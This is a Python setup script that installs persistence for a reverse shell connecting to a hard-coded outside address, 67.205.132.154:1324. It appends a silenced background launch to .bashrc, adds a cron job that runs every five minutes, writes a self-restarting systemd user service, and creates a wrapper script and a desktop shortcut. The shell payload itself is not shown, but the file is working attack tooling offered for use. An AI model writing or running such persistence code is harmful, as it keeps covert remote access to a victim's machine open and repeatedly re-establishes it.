#!/usr/bin/env python3
"""
Reverse Shell Auto-Run Setup (Python)
====================================

This script sets up automatic execution of the reverse shell.
Pure Python implementation - no bash scripts needed!
"""

import os
import sys
import platform
import getpass
import subprocess
from pathlib import Path


def print_banner():
    """Print a nice banner."""
    print("=" * 50)
    print("🚀 REVERSE SHELL AUTO-RUN SETUP")
    print("=" * 50)
    print("This will set up automatic execution of the reverse shell.")
    print("Default connection: 67.205.132.154:1324")
    print()


def check_uv():
    """Check if uv is available."""
    try:
        subprocess.run(['uv', '--version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


def setup_bashrc():
    """Set up .bashrc for auto-start on login."""
    home = Path.home()
    bashrc = home / '.bashrc'
    project_dir = Path(__file__).parent.absolute()

    # Command to add
    command = f'cd {project_dir} && uv run reverse-shell'

    # Check if already configured
    if bashrc.exists():
        with open(bashrc, 'r') as f:
            if 'reverse-shell' in f.read():
                print("✅ .bashrc already configured")
                return

    # Add to .bashrc
    with open(bashrc, 'a') as f:
        f.write(f'\n# Reverse Shell Auto-Start\n')
        f.write(f'(sleep 5 && {command} > /dev/null 2>&1 &) &\n')

    print("✅ Added to .bashrc (starts on next login)")


def setup_cron():
    """Set up cron job for periodic execution."""
    project_dir = Path(__file__).parent.absolute()
    command = f'cd {project_dir} && uv run reverse-shell'

    # Check existing cron jobs
    try:
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        existing_cron = result.stdout if result.returncode == 0 else ""
    except subprocess.CalledProcessError:
        existing_cron = ""

    if 'reverse-shell' in existing_cron:
        print("✅ Cron job already configured")
        return

    # Add new cron job (runs every 5 minutes)
    new_cron = existing_cron + f'\n# Reverse Shell (runs every 5 minutes)\n*/5 * * * * {command}\n'

    # Set new crontab
    subprocess.run(['crontab', '-'], input=new_cron, text=True, check=True)
    print("✅ Cron job added (runs every 5 minutes)")


def setup_systemd():
    """Set up systemd user service."""
    home = Path.home()
    service_dir = home / '.config' / 'systemd' / 'user'
    service_file = service_dir / 'reverse-shell.service'
    project_dir = Path(__file__).parent.absolute()

    service_dir.mkdir(parents=True, exist_ok=True)

    if service_file.exists():
        print("✅ Systemd service already exists")
        return

    # Create service file
    service_content = f"""[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
Type=simple
ExecStart={project_dir}/run_reverse_shell.py
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""

    with open(service_file, 'w') as f:
        f.write(service_content)

    print("✅ Systemd service created")
    print("   To enable: systemctl --user daemon-reload && systemctl --user enable reverse-shell.service")


def create_wrapper_script():
    """Create a simple Python wrapper script."""
    project_dir = Path(__file__).parent
    wrapper = project_dir / 'run_reverse_shell.py'

    wrapper_content = '''#!/usr/bin/env python3
"""
Simple wrapper to run the reverse shell.
"""
import subprocess
import sys
import os

# Change to script directory
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# Run the reverse shell
try:
    subprocess.run([sys.executable, "-m", "uv", "run", "reverse-shell"], check=True)
except subprocess.CalledProcessError as e:
    print(f"Failed to run reverse shell: {e}")
    sys.exit(1)
'''

    with open(wrapper, 'w') as f:
        f.write(wrapper_content)

    # Make executable
    os.chmod(wrapper, 0o755)
    print("✅ Created wrapper script: run_reverse_shell.py")


def create_desktop_shortcut():
    """Create desktop shortcut."""
    home = Path.home()
    desktop = home / 'Desktop'
    project_dir = Path(__file__).parent

    if not desktop.exists():
        return

    shortcut_file = desktop / 'ReverseShell.desktop'
    wrapper_path = project_dir / 'run_reverse_shell.py'

    shortcut_content = f"""[Desktop Entry]
Version=1.0
Type=Application
Name=Reverse Shell
Comment=Start Reverse Shell Service
Exec=gnome-terminal -- {wrapper_path}
Icon=terminal
Terminal=false
"""

    with open(shortcut_file, 'w') as f:
        f.write(shortcut_content)

    os.chmod(shortcut_file, 0o755)
    print("✅ Desktop shortcut created")


def main():
    """Main setup function."""
    print_banner()

    if not check_uv():
        print("❌ Error: uv is not installed!")
        print("   Install uv first: curl -LsSf https://astral.sh/uv/install.sh | sh")
        sys.exit(1)

    print("Setting up automatic reverse shell execution...")
    print()

    try:
        setup_bashrc()
        setup_cron()
        setup_systemd()
        create_wrapper_script()
        create_desktop_shortcut()

        print()
        print("🎉 Setup complete!")
        print()
        print("The reverse shell will now start automatically:")
        print("• On login (via .bashrc)")
        print("• Every 5 minutes (via cron)")
        print("• As systemd service (if enabled)")
        print("• Via desktop shortcut")
        print()
        print("To start manually:")
        print("  uv run reverse-shell")
        print()
        print("To test the connection:")
        print("  uv run reverse-shell --once")

    except Exception as e:
        print(f"❌ Setup failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
